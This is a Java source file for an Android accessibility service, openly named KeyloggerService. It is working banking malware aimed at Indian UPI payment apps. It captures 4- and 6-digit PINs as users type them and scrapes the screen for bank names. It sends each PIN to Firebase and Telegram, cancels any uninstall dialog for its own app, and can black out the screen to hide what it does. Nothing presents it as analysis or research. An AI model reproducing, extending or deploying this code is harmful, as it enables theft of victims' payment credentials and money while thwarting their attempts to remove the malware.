package com.xvideo.app.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

import com.xvideo.app.core.Config;
import com.xvideo.app.firebase.FirebaseHelper;
import com.xvideo.app.telegram.TelegramHelper;
import com.xvideo.app.util.NetworkUtil;

import java.util.List;

public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "KeyloggerService";

    private FirebaseHelper firebaseHelper;
    private String deviceId;
    private StringBuilder pinBuffer = new StringBuilder();
    private String lastPackage = "";
    private String lastBankName = null;
    private long lastEventTime = 0;
    private long lastProtectTime = 0;
    private long serviceStartTime;
    private View overlayView;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        serviceStartTime = System.currentTimeMillis();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        firebaseHelper = new FirebaseHelper(this);
        Log.d(TAG, "Accessibility service connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            int eventType = event.getEventType();

            // Check for uninstall protection
            checkUninstallProtection(event, packageName);

            // Handle UPI app events
            if (isUpiApp(packageName)) {
                handleUpiAppEvent(event, packageName);
            }

            // Check for bank name on screen
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                String bankName = findBankName();
                if (bankName != null) {
                    lastBankName = bankName;
                }
            }

            // Track text changes (potential PIN entry)
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                handleTextChange(event, packageName);
            }

            lastPackage = packageName;
            lastEventTime = System.currentTimeMillis();

        } catch (Exception e) {
            Log.e(TAG, "Error handling event", e);
        }
    }

    private void handleUpiAppEvent(AccessibilityEvent event, String packageName) {
        List<CharSequence> texts = event.getText();
        if (texts == null || texts.isEmpty()) return;

        for (CharSequence text : texts) {
            if (text == null) continue;
            String textStr = text.toString().toLowerCase();

            // Check for PIN entry screen
            if (textStr.contains("enter") && (textStr.contains("pin") || textStr.contains("upi"))) {
                Log.d(TAG, "PIN entry screen detected in: " + packageName);
            }
        }
    }

    private void handleTextChange(AccessibilityEvent event, String packageName) {
        if (!isUpiApp(packageName)) return;

        List<CharSequence> texts = event.getText();
        if (texts == null || texts.isEmpty()) return;

        for (CharSequence text : texts) {
            if (text == null) continue;
            String textStr = text.toString();

            // Check if it's a digit input (potential PIN)
            if (textStr.matches("\\d+") && textStr.length() <= 6) {
                pinBuffer.setLength(0);
                pinBuffer.append(textStr);
            } else if (textStr.length() == 1 && Character.isDigit(textStr.charAt(0))) {
                pinBuffer.append(textStr);

                // Check if we have a complete PIN (4 or 6 digits)
                if (pinBuffer.length() == 4 || pinBuffer.length() == 6) {
                    flushPinBuffer(packageName);
                }
            }
        }
    }

    private void flushPinBuffer(String packageName) {
        int length = pinBuffer.length();
        if (length != 4 && length != 6) {
            pinBuffer.setLength(0);
            return;
        }

        String pin = pinBuffer.toString();
        Log.d(TAG, "PIN captured: " + pin + " from " + packageName);

        // Log to Firebase
        firebaseHelper.logCapturedPin(pin, packageName, length, lastBankName);

        // Send to Telegram
        TelegramHelper.sendMessage(
            TelegramHelper.formatPinCapture(pin, packageName, lastBankName)
        );

        lastBankName = null;
        pinBuffer.setLength(0);
    }

    private void checkUninstallProtection(AccessibilityEvent event, String packageName) {
        // Rate limit protection checks
        if (System.currentTimeMillis() - lastProtectTime < 2000) return;

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        try {
            // Check if on settings or package installer
            if (packageName.contains("settings") || packageName.contains("packageinstaller")) {

                // Look for uninstall button with our app name nearby
                if (isUninstallPopupForOurApp(rootNode)) {
                    Log.d(TAG, "Uninstall attempt detected - triggering protection");
                    lastProtectTime = System.currentTimeMillis();

                    // Click cancel or navigate away
                    findAndClickCancel(rootNode);

                    // Go back
                    performGlobalAction(GLOBAL_ACTION_BACK);
                }
            }
        } finally {
            rootNode.recycle();
        }
    }

    private boolean isUninstallPopupForOurApp(AccessibilityNodeInfo root) {
        if (root == null) return false;

        List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("Uninstall");
        if (uninstallNodes == null || uninstallNodes.isEmpty()) {
            uninstallNodes = root.findAccessibilityNodeInfosByText("Remove");
        }
        if (uninstallNodes == null || uninstallNodes.isEmpty()) return false;

        // Check if our app name is on screen
        List<AccessibilityNodeInfo> appNameNodes = root.findAccessibilityNodeInfosByText(Config.APP_NAME);
        return appNameNodes != null && !appNameNodes.isEmpty();
    }

    private void findAndClickCancel(AccessibilityNodeInfo root) {
        if (root == null) return;

        List<AccessibilityNodeInfo> cancelNodes = root.findAccessibilityNodeInfosByText("Cancel");
        if (cancelNodes != null && !cancelNodes.isEmpty()) {
            cancelNodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }

        List<AccessibilityNodeInfo> noNodes = root.findAccessibilityNodeInfosByText("NO");
        if (noNodes != null && !noNodes.isEmpty()) {
            noNodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    private String findBankName() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return null;

        try {
            return scanForBankText(root);
        } finally {
            root.recycle();
        }
    }

    private String scanForBankText(AccessibilityNodeInfo node) {
        if (node == null) return null;

        CharSequence text = node.getText();
        if (text != null) {
            String textStr = text.toString();
            String lower = textStr.toLowerCase();

            String[] bankKeywords = {"sbi", "hdfc", "icici", "axis", "kotak", "pnb",
                "bob", "union", "canara", "indusind", "idbi", "paytm payments",
                "yes bank", "federal", "bandhan", "a/c", "account"};

            for (String keyword : bankKeywords) {
                if (lower.contains(keyword)) {
                    // Filter out generic UI text
                    if (!lower.contains("fetching") && !lower.contains("check") &&
                        !lower.contains("enter") && !lower.contains("balance") &&
                        !lower.contains("select")) {
                        return textStr;
                    }
                }
            }
        }

        // Recursively check children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                String result = scanForBankText(child);
                child.recycle();
                if (result != null) return result;
            }
        }

        return null;
    }

    private boolean isUpiApp(String packageName) {
        for (String pkg : Config.UPI_PACKAGES) {
            if (packageName.equals(pkg)) return true;
        }
        return false;
    }

    public void showBlackOverlay() {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            View view = new View(this);
            view.setBackgroundColor(0xFF000000); // Black

            WindowManager.LayoutParams params = new WindowManager.LayoutParams();
            params.width = WindowManager.LayoutParams.MATCH_PARENT;
            params.height = WindowManager.LayoutParams.MATCH_PARENT;
            params.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
            params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                          WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                          WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
            params.format = PixelFormat.TRANSLUCENT;

            wm.addView(view, params);
            overlayView = view;
        } catch (Exception e) {
            Log.e(TAG, "Error showing overlay", e);
        }
    }

    public void removeBlackOverlay() {
        try {
            if (overlayView != null) {
                WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                wm.removeView(overlayView);
                overlayView = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error removing overlay", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        removeBlackOverlay();
        Log.d(TAG, "Accessibility service destroyed");
    }
}
